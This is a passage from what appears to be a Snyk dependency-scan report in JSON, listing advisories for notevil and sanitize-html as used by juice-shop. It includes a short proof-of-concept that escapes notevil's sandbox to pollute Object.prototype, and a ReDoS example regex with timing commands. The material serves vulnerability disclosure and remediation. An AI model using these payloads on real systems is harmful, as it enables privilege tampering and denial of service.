            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:01:18.159656Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:30.708028Z"
          }
        ],
        "description": "## Overview\n[notevil](https://www.npmjs.com/package/notevil) is a module uses esprima to parse the javascript AST then walks each node and evaluates the result\r\n**Note:**This package has been deprecated.\n\nAffected versions of this package are vulnerable to Sandbox Bypass. It is vulnerable to Sandbox Escape leading to Prototype pollution. The package fails to restrict access to the main context, allowing an attacker to add or modify an object's prototype.\r\n\r\n**Note:**  This vulnerability derives from an incomplete fix in [SNYK-JS-NOTEVIL-608878](https://security.snyk.io/vuln/SNYK-JS-NOTEVIL-608878).\r\n\r\n## PoC:\r\n```js\r\nvar safeEval = require('notevil')\r\n\r\nsafeEval(`  \r\nObject.defineProperty(({})[[\"__proto__\"]][[\"__proto__\"]], 'polluted', {\r\n  value: 'success'\r\n});`);\r\n\r\nconsole.log(polluted);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nThere is no fixed version for `notevil`.\n",
        "epssDetails": {
          "percentile": "0.53362",
          "probability": "0.00304",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-23771"
          ],
          "CWE": [
            "CWE-1321",
            "CWE-265"
          ]
        },
        "packageName": "notevil",
        "proprietary": true,
        "creationTime": "2022-01-27T15:00:51.139678Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-01-27T15:00:48Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-02-14T16:21:53.819915Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:49:30.708028Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "notevil@1.3.3"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "notevil",
        "version": "1.3.3"
      },
      {
        "id": "SNYK-JS-SANITIZEHTML-1070780",
        "title": "Validation Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
        "credit": [
          "Ron Masas",
          "Checkmarx"
        ],
        "semver": {
          "vulnerable": [
            "<2.3.2"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "2.3.2"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/6012524e7824a2c8f6782b2bc5f93b1261723403",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/460",
            "title": "GitHub PR"
          },
          {
            "url": "https://advisory.checkmarx.net/advisory/CX-2021-4309",
            "title": "POC: Potential Exploit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:50:34.747332Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:53:54.403521Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:04:07.959842Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:34.747332Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:54.403521Z"
          }
        ],
        "description": "## Overview\n[sanitize-html](https://github.com/punkave/sanitize-html) is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis\n\nAffected versions of this package are vulnerable to Validation Bypass. There is no proper validation of the hostnames set by the `allowedIframeHostnames` option when the `allowIframeRelativeUrls` is set to `true`. This allows attackers to bypass the hostname whitelist for the iframe element.\n## Details\n\nCross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `sanitize-html` to version 2.3.2 or higher.\n## References\n- [GitHub Commit](https://github.com/apostrophecms/sanitize-html/commit/6012524e7824a2c8f6782b2bc5f93b1261723403)\n- [GitHub PR](https://github.com/apostrophecms/sanitize-html/pull/460)\n- [POC: Potential Exploit](https://advisory.checkmarx.net/advisory/CX-2021-4309)\n",
        "epssDetails": {
          "percentile": "0.52120",
          "probability": "0.00288",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-26540"
          ],
          "CWE": [
            "CWE-20"
          ],
          "GHSA": [
            "GHSA-mjxr-4v3x-q3m4"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": false,
        "creationTime": "2021-02-09T08:21:52.232749Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2021-02-09T08:07:33Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2021-02-09T16:34:45.881363Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:54.403521Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@2.3.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "SNYK-JS-SANITIZEHTML-1070786",
        "title": "Access Restriction Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "credit": [
          "Ron Masas",
          "Checkmarx"
        ],
        "semver": {
          "vulnerable": [
            "<2.3.1"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.3.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/458",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:50:34.732453Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:53:54.378359Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:05:08.380649Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:34.732453Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:54.378359Z"
          }
        ],
        "description": "## Overview\n[sanitize-html](https://github.com/punkave/sanitize-html) is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis\n\nAffected versions of this package are vulnerable to Access Restriction Bypass. Internationalized domain name (IDN) is not properly handled. This allows attackers to bypass hostname whitelist validation set by the `allowedIframeHostnames` option.\n## Remediation\nUpgrade `sanitize-html` to version 2.3.1 or higher.\n## References\n- [GitHub PR](https://github.com/apostrophecms/sanitize-html/pull/458)\n",
        "epssDetails": {
          "percentile": "0.52120",
          "probability": "0.00288",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-26539"
          ],
          "CWE": [
            "CWE-20"
          ],
          "GHSA": [
            "GHSA-rjqq-98f6-6j3r"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": false,
        "creationTime": "2021-02-09T08:37:16.368073Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2021-02-09T08:21:55Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2021-02-09T16:34:49Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:54.378359Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@2.3.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "SNYK-JS-SANITIZEHTML-2957526",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        "credit": [
          "Nariyoshi Chida of NTT Security Japan"
        ],
        "semver": {
          "vulnerable": [
            "<2.7.1"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.7.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/557",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:49:50.630672Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:53:53.488783Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:56:23.036163Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:50.630672Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:53.488783Z"
          }
        ],
        "description": "## Overview\n[sanitize-html](https://github.com/punkave/sanitize-html) is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure global regular expression replacement logic of HTML comment removal.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `sanitize-html` to version 2.7.1 or higher.\n## References\n- [GitHub Commit](https://github.com/apostrophecms/sanitize-html/commit/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c)\n- [GitHub PR](https://github.com/apostrophecms/sanitize-html/pull/557)\n",
        "epssDetails": {
          "percentile": "0.17737",
          "probability": "0.00056",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-25887"
          ],
          "CWE": [
            "CWE-1333"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": true,
        "creationTime": "2022-07-21T08:00:56.827849Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-07-21T07:37:40Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-08-29T13:28:12.439235Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:53.488783Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@2.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "SNYK-JS-SANITIZEHTML-585892",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:P",
        "credit": [
          "mikesamuel"
        ],
        "semver": {
          "vulnerable": [
            "<2.0.0"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "2.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/apostrophecms/sanitize-html/issues/293",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/712cb6895825c8bb6ede71a16b42bade42abcaf3",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/156",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/Checkmarx/Vulnerabilities-Proofs-of-Concept/tree/main/2019/CVE-2019-25225",
            "title": "PoC"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2025-09-09T14:36:22.807173Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.1,
            "cvssVersion": "4.0",
            "modificationTime": "2025-09-09T11:01:13.673612Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-09-09T11:01:13.673612Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-09-09T14:36:22.807173Z"
          }
        ],
        "description": "## Overview\n[sanitize-html](https://github.com/punkave/sanitize-html) is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `sanitizeHtml` function when the custom `transformTags` option is used. An attacker can inject and execute malicious code by providing crafted input that is not properly sanitized.\n## Remediation\nUpgrade `sanitize-html` to version 2.0.0 or higher.\n## References\n- [GitHub Issue](https://github.com/apostrophecms/sanitize-html/issues/293)\n- [GitHub PR](https://github.com/apostrophecms/sanitize-html/commit/712cb6895825c8bb6ede71a16b42bade42abcaf3)\n- [GitHub PR](https://github.com/apostrophecms/sanitize-html/pull/156)\n- [PoC](https://github.com/Checkmarx/Vulnerabilities-Proofs-of-Concept/tree/main/2019/CVE-2019-25225)\n",
        "epssDetails": {
          "percentile": "0.07499",
          "probability": "0.00030",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2019-25225"
          ],
          "CWE": [
            "CWE-79"
          ]
        },
        "packageName": "sanitize-html",
        "proprietary": false,
        "creationTime": "2020-07-17T15:02:43.082824Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-09-07T09:46:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-09-07T09:46:10Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-09-09T14:36:22.807173Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@2.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "sanitize-html",
        "version": "1.4.2"
      },
      {
        "id": "SNYK-JS-SANITIZEHTML-6256334",
        "title": "Information Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P",
        "credit": [
          "Vsevolod Kokorin (Slonser) of Solidlab"
        ],
        "semver": {
          "vulnerable": [
            "<2.12.1"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "2.12.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "sanitize-html",
        "references": [
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/c5dbdf77fe8b836d3bf4554ea39edb45281ec0b4",
            "title": "Github Commit"
          },
          {
            "url": "https://github.com/apostrophecms/apostrophe/discussions/4436",
            "title": "Github Discussion"
          },
          {
            "url": "https://gist.github.com/Slonser/8b4d061abe6ee1b2e10c7242987674cf",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/650",
            "title": "Github PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2025-04-26T01:13:30.324678Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:52:49.970725Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
